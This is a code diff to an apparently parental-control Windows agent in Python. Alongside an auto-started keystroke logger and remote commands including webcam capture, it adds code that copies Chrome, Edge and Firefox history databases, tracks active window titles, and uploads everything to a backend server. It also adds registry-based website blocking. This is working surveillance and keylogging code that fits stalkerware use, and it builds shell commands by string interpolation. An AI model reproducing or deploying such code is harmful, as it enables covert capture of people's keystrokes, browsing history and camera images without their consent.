@@ -13,12 +13,15 @@ import psutil
 import base64
 import sqlite3
 from io import BytesIO
-from datetime import datetime
+from datetime import datetime, timedelta
+import glob
 from pymongo import MongoClient
 from pynput import keyboard
 from dotenv import load_dotenv
 import pyautogui
 import cv2
+import pygetwindow as gw
+import winreg
 
 # Load environment variables from .env file
 load_dotenv()
@@ -39,6 +42,15 @@ keystrokes_col = db["keystrokes"]
 keylogger_running = False
 captured_text = ""
 listener = None
+browser_usage_buffer = {}
+browser_usage_lock = threading.Lock()
+BROWSER_KEYWORDS = {
+    "chrome": "Chrome",
+    "edge": "Edge",
+    "firefox": "Firefox"
+}
+app_usage_buffer = {}
+app_usage_lock = threading.Lock()
 
 # ==================== KEYSTROKE LOGGING ====================
 
@@ -404,6 +416,26 @@ def send_browser_history_to_backend(history):
         print(f"Error sending browser history: {e}")
     return False
 
+def send_browser_usage_to_backend(usage):
+    """Send browser usage time to backend via API"""
+    try:
+        if usage:
+            payload = {
+                "device_id": DEVICE_ID,
+                "usage": usage
+            }
+            response = requests.post(
+                f"{BACKEND_URL}/api/send-browser-usage",
+                json=payload,
+                timeout=5
+            )
+            if response.status_code == 200:
+                print(f"✅ Browser usage sent to backend ({len(usage)} entries)")
+                return True
+    except Exception as e:
+        print(f"Error sending browser usage: {e}")
+    return False
+
 def send_app_usage_to_backend(usage):
     """Send app usage data to backend via API"""
     try:
@@ -424,6 +456,159 @@ def send_app_usage_to_backend(usage):
         print(f"Error sending app usage: {e}")
     return False
 
+def _webkit_time_to_datetime(value):
+    try:
+        return datetime(1601, 1, 1) + timedelta(microseconds=int(value))
+    except Exception:
+        return None
+
+def _epoch_micro_to_datetime(value):
+    try:
+        return datetime.utcfromtimestamp(int(value) / 1_000_000)
+    except Exception:
+        return None
+
+def _get_chromium_history(history_path, browser_name, limit=50):
+    if not os.path.exists(history_path):
+        return []
+    temp_db = f"temp_{browser_name.lower()}_history.db"
+    try:
+        os.system(f'copy "{history_path}" "{temp_db}"')
+        conn = sqlite3.connect(temp_db)
+        cursor = conn.cursor()
+        cursor.execute(
+            "SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT ?",
+            (limit,)
+        )
+        rows = cursor.fetchall()
+        conn.close()
+        os.remove(temp_db)
+        results = []
+        for url, title, last_visit_time in rows:
+            visited_at = _webkit_time_to_datetime(last_visit_time)
+            results.append({
+                "url": url,
+                "title": title,
+                "visited_at": visited_at.isoformat() if visited_at else None,
+                "browser": browser_name
+            })
+        return results
+    except Exception as e:
+        print(f"Error reading {browser_name} history: {e}")
+        try:
+            if os.path.exists(temp_db):
+                os.remove(temp_db)
+        except Exception:
+            pass
+        return []
+
+def _get_firefox_history(limit=50):
+    results = []
+    profiles_path = os.path.expanduser(r"~\AppData\Roaming\Mozilla\Firefox\Profiles\*")
+    for profile in glob.glob(profiles_path):
+        history_path = os.path.join(profile, "places.sqlite")
+        if not os.path.exists(history_path):
+            continue
+        temp_db = "temp_firefox_history.db"
+        try:
+            os.system(f'copy "{history_path}" "{temp_db}"')
+            conn = sqlite3.connect(temp_db)
+            cursor = conn.cursor()
+            cursor.execute(
+                """
+                SELECT p.url, p.title, v.visit_date
+                FROM moz_places p
+                JOIN moz_historyvisits v ON v.place_id = p.id
+                ORDER BY v.visit_date DESC
+                LIMIT ?
+                """,
+                (limit,)
+            )
+            rows = cursor.fetchall()
+            conn.close()
+            os.remove(temp_db)
+            for url, title, visit_date in rows:
+                visited_at = _epoch_micro_to_datetime(visit_date)
+                results.append({
+                    "url": url,
+                    "title": title,
+                    "visited_at": visited_at.isoformat() if visited_at else None,
+                    "browser": "Firefox"
+                })
+        except Exception as e:
+            print(f"Error reading Firefox history: {e}")
+            try:
+                if os.path.exists(temp_db):
+                    os.remove(temp_db)
+            except Exception:
+                pass
+    return results
+
+def get_all_browser_history():
+    history = []
+    chrome_path = os.path.expanduser(r"~\AppData\Local\Google\Chrome\User Data\Default\History")
+    edge_path = os.path.expanduser(r"~\AppData\Local\Microsoft\Edge\User Data\Default\History")
+    history.extend(_get_chromium_history(chrome_path, "Chrome"))
+    history.extend(_get_chromium_history(edge_path, "Edge"))
+    history.extend(_get_firefox_history())
+    return history
+
+def _get_active_browser():
+    try:
+        window = gw.getActiveWindow()
+        title = window.title if window else ""
+        if not title:
+            return None, ""
+        title_lower = title.lower()
+        for key, label in BROWSER_KEYWORDS.items():
+            if key in title_lower:
+                return label, title
+        return None, title
+    except Exception:
+        return None, ""
+
+def track_browser_usage():
+    """Track active browser window time and send periodically"""
+    sample_interval = 10
+    flush_interval = 300
+    elapsed = 0
+    while keylogger_running:
+        browser, title = _get_active_browser()
+        if browser:
+            with browser_usage_lock:
+                entry = browser_usage_buffer.get(browser, {"duration": 0, "window_title": ""})
+                entry["duration"] += sample_interval
+                entry["window_title"] = title
+                browser_usage_buffer[browser] = entry
+        time.sleep(sample_interval)
+        elapsed += sample_interval
+        if elapsed >= flush_interval:
+            with browser_usage_lock:
+                usage_payload = [
+                    {"browser": name, "duration": data["duration"], "window_title": data["window_title"]}
+                    for name, data in browser_usage_buffer.items()
+                    if data.get("duration", 0) > 0
+                ]
+                browser_usage_buffer.clear()
+            if usage_payload:
+                send_browser_usage_to_backend(usage_payload)
+            elapsed = 0
+
+def _get_active_app_title():
+    try:
+        window = gw.getActiveWindow()
+        title = window.title if window else ""
+        if not title:
+            return "Unknown"
+        for key in BROWSER_KEYWORDS.keys():
+            if key in title.lower():
+                return None
+        if " - " in title:
+            return title.split(" - ")[0].strip() or title
+        return title
+    except Exception:
+        return "Unknown"
+
 # ==================== DEVICE REGISTRATION ====================
 
 def register_device():
@@ -443,6 +628,30 @@ def register_device():
     except Exception as e:
         print(f"Error registering device: {e}")
         return False
+
+def request_claim_code():
+    """Request a claim code for this device"""
+    try:
+        payload = {
+            "device_id": DEVICE_ID,
+            "device_name": DEVICE_NAME
+        }
+        response = requests.post(f"{BACKEND_URL}/api/device/claim-code", json=payload, timeout=5)
+        if response.status_code == 200:
+            data = response.json()
+            code = data.get("claim_code")
+            if code:
+                print("\n" + "=" * 60)
+                print("🔑 DEVICE CLAIM CODE")
+                print(f"Code: {code}")
+                print("Parent: login to dashboard and enter this code to claim this device")
+                print("=" * 60 + "\n")
+                return code
+        else:
+            print(f"Claim code request failed: {response.text}")
+    except Exception as e:
+        print(f"Error requesting claim code: {e}")
+    return None
 
 # ==================== COMMAND EXECUTION ====================
 
@@ -534,6 +743,11 @@ def execute_command(cmd):
             result = unblock_websites(websites)
             send_result(command_id, {"type": "unblock_website", **result})
         
+        elif command_type == "Sync Website Blocking":
+            print("🔄 Syncing website blocking policies...")
+            fetch_and_apply_blocked_websites()
+            send_result(command_id, {"type": "sync_blocking", "success": True, "message": "Blocking policies synced. Please restart your browsers."})
+        
         # New unified app blocking commands (block_app instead of block_exe)
         elif command_type == "block_app":
             app_name = params.get('app_name', 'unknown.exe')
@@ -592,18 +806,9 @@ def execute_command(cmd):
                 send_result(command_id, {"type": "webcam", "success": False, "message": str(e)})
         
         elif command_type == "chromehistory":
-            print("🌐 Fetching Chrome history...")
-            chrome_history_path = os.path.expanduser("~") + r"\AppData\Local\Google\Chrome\User Data\Default\History"
-            temp_history_db = "temp_chrome_history.db"
             try:
-                os.system(f'copy "{chrome_history_path}" "{temp_history_db}"')
-                conn = sqlite3.connect(temp_history_db)
-                cursor = conn.cursor()
-                cursor.execute("SELECT url, title FROM urls ORDER BY last_visit_time DESC LIMIT 50")
-                history = cursor.fetchall()
-                conn.close()
-                os.remove(temp_history_db)
-                history_list = [{"url": url, "title": title} for url, title in history]
+                print("🌐 Fetching browser history (Chrome, Edge, Firefox)...")
+                history_list = get_all_browser_history()
                 
                 # Send to backend (NEW)
                 send_browser_history_to_backend(history_list)
@@ -684,26 +889,200 @@ def send_periodic_location():
 
 def send_periodic_app_usage():
     """Send app usage to backend periodically"""
+    sample_interval = 10
+    flush_interval = 600
+    elapsed = 0
     while keylogger_running:
         try:
-            # Get list of running processes (simple app usage tracking)
-            usage_data = []
-            for proc in psutil.process_iter(['pid', 'name']):
-                try:
-                    usage_data.append({
-                        "name": proc.info['name'],
-                        "pid": proc.info['pid']
-                    })
-                except psutil.NoSuchProcess:
-                    pass
-            
-            if usage_data:
-                send_app_usage_to_backend(usage_data)
-            
-            time.sleep(600)  # Every 10 minutes
+            app_title = _get_active_app_title()
+            if app_title:
+                with app_usage_lock:
+                    entry = app_usage_buffer.get(app_title, {"duration": 0})
+                    entry["duration"] += sample_interval
+                    app_usage_buffer[app_title] = entry
+            time.sleep(sample_interval)
+            elapsed += sample_interval
+            if elapsed >= flush_interval:
+                with app_usage_lock:
+                    usage_payload = [
+                        {"app_name": name, "duration": data["duration"]}
+                        for name, data in app_usage_buffer.items()
+                        if data.get("duration", 0) > 0
+                    ]
+                    app_usage_buffer.clear()
+                if usage_payload:
+                    send_app_usage_to_backend(usage_payload)
+                elapsed = 0
         except Exception as e:
             print(f"App usage tracking error: {e}")
             time.sleep(60)
+
+# ==================== WEBSITE BLOCKING ====================
+
+def normalize_blocked_urls(urls):
+    """Normalize URLs to block all variations (http, https, www, subdomains)"""
+    normalized = []
+    
+    for url in urls:
+        # Remove protocol if present
+        url = url.replace('http://', '').replace('https://', '')
+        # Remove trailing slash
+        url = url.rstrip('/')
+        
+        # Don't modify if already has wildcard
+        if url.startswith('*.'):
+            normalized.append(url)
+        else:
+            # Add original domain
+            normalized.append(url)
+            # Add wildcard for all subdomains if not already www
+            if not url.startswith('www.'):
+                normalized.append(f"*.{url}")
+                normalized.append(f"www.{url}")
+            else:
+                # If starts with www, also add version without www and with wildcard
+                domain_without_www = url.replace('www.', '', 1)
+                normalized.append(domain_without_www)
+                normalized.append(f"*.{domain_without_www}")
+            
+            # Add common protocol patterns
+            normalized.append(f"{url}/*")
+    
+    # Remove duplicates while preserving order
+    seen = set()
+    result = []
+    for item in normalized:
+        if item not in seen:
+            seen.add(item)
+            result.append(item)
+    
+    return result
+
+def apply_chrome_blocking(urls):
+    """Apply URL blocking to Chrome via Windows Registry (user-level, no admin needed)"""
+    try:
+        # Normalize URLs to block all variations
+        normalized_urls = normalize_blocked_urls(urls) if urls else []
+        
+        # Open/Create Chrome Policies key in HKEY_CURRENT_USER (no admin required)
+        key_path = r"Software\Policies\Google\Chrome\URLBlocklist"
+        try:
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS)
+        except FileNotFoundError:
+            # Create the key if it doesn't exist
+            key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS)
+        
+        # Clear existing entries
+        try:
+            i = 0
+            while True:
+                winreg.DeleteValue(key, str(i))
+                i += 1
+        except FileNotFoundError:
+            pass  # No more values to delete
+        
+        # Add new blocked URLs
+        for idx, url in enumerate(normalized_urls):
+            winreg.SetValueEx(key, str(idx), 0, winreg.REG_SZ, url)
+        
+        winreg.CloseKey(key)
+        print(f"✅ Chrome blocking applied: {len(urls)} websites ({len(normalized_urls)} patterns)")
+        if normalized_urls:
+            print(f"   Patterns: {', '.join(normalized_urls[:5])}{'...' if len(normalized_urls) > 5 else ''}")
+        return True
+    except Exception as e:
+        print(f"❌ Chrome blocking failed: {e}")
+        return False
+
+def apply_edge_blocking(urls):
+    """Apply URL blocking to Edge via Windows Registry (user-level, no admin needed)"""
+    try:
+        # Normalize URLs to block all variations
+        normalized_urls = normalize_blocked_urls(urls) if urls else []
+        
+        # Open/Create Edge Policies key in HKEY_CURRENT_USER (no admin required)
+        key_path = r"Software\Policies\Microsoft\Edge\URLBlocklist"
+        try:
+            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS)
+        except FileNotFoundError:
+            # Create the key if it doesn't exist
+            key = winreg.CreateKeyEx(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS)
+        
+        # Clear existing entries
+        try:
+            i = 0
+            while True:
+                winreg.DeleteValue(key, str(i))
+                i += 1
+        except FileNotFoundError:
+            pass  # No more values to delete
+        
+        # Add new blocked URLs
+        for idx, url in enumerate(normalized_urls):
+            winreg.SetValueEx(key, str(idx), 0, winreg.REG_SZ, url)
+        
+        winreg.CloseKey(key)
+        print(f"✅ Edge blocking applied: {len(urls)} websites ({len(normalized_urls)} patterns)")
+        if normalized_urls:
+            print(f"   Patterns: {', '.join(normalized_urls[:5])}{'...' if len(normalized_urls) > 5 else ''}")
+        return True
+    except Exception as e:
+        print(f"❌ Edge blocking failed: {e}")
+        return False
+
+def fetch_and_apply_blocked_websites():
+    """Fetch blocked websites from backend and apply to browsers"""
+    try:
+        print(f"\n{'='*60}")
+        print(f"🔄 Fetching blocked websites from backend...")
+        print(f"{'='*60}")
+        
+        response = requests.get(f"{BACKEND_URL}/api/device/{DEVICE_ID}/blocked-websites", timeout=10)
+        
+        if response.status_code == 200:
+            data = response.json()
+            urls = data.get("urls", [])
+            
+            print(f"📥 Received {len(urls)} websites to block")
+            if urls:
+                print(f"   URLs: {', '.join(urls)}")
+            
+            if urls:
+                print(f"\n🚫 Applying website blocking...")
+                # Apply to both Chrome and Edge
+                chrome_ok = apply_chrome_blocking(urls)
+                edge_ok = apply_edge_blocking(urls)
+                
+                if chrome_ok or edge_ok:
+                    print(f"\n{'='*60}")
+                    print(f"✅ BLOCKING APPLIED SUCCESSFULLY!")
+                    print(f"{'='*60}")
+                    print(f"⚠️ IMPORTANT: You must RESTART your browser for changes to take effect!")
+                    print(f"   1. Close ALL browser windows")
+                    print(f"   2. End browser processes in Task Manager (if needed)")
+                    print(f"   3. Restart browser and try visiting blocked sites")
+                    print(f"{'='*60}\n")
+            else:
+                # No websites to block, clear existing blocks
+                apply_chrome_blocking([])
+                apply_edge_blocking([])
+                print("✅ No websites blocked - all policies cleared")
+        else:
+            print(f"❌ Failed to fetch blocked websites: HTTP {response.status_code}")
+    except requests.exceptions.RequestException as e:
+        print(f"❌ Network error syncing blocked websites: {e}")
+    except Exception as e:
+        print(f"❌ Error syncing blocked websites: {e}")
+
+def sync_blocked_websites_loop():
+    """Periodically sync blocked websites every 5 minutes"""
+    while True:
+        try:
+            fetch_and_apply_blocked_websites()
+            time.sleep(300)  # Check every 5 minutes
+        except Exception as e:
+            print(f"Blocked websites sync error: {e}")
+            time.sleep(300)
 
 def main():
     """Main function"""
@@ -722,6 +1101,9 @@ def main():
         print("Failed to register device. Retrying in 10 seconds...")
         time.sleep(10)
         return
+
+    # Request claim code for parent self-assign
+    request_claim_code()
     
     # Auto-start keylogger when device connects
     print("Auto-starting keystroke monitoring...")
@@ -734,6 +1116,17 @@ def main():
     # Start app usage tracking thread (every 10 minutes)
     app_usage_thread = threading.Thread(target=send_periodic_app_usage, daemon=True)
     app_usage_thread.start()
+
+    # Start browser usage tracking thread
+    browser_usage_thread = threading.Thread(target=track_browser_usage, daemon=True)
+    browser_usage_thread.start()
+    
+    # Start website blocking sync thread
+    blocking_thread = threading.Thread(target=sync_blocked_websites_loop, daemon=True)
+    blocking_thread.start()
+    
+    # Initial sync of blocked websites
+    fetch_and_apply_blocked_websites()
     
     # Start sync thread
     sync_thread = threading.Thread(target=sync_loop, daemon=True)
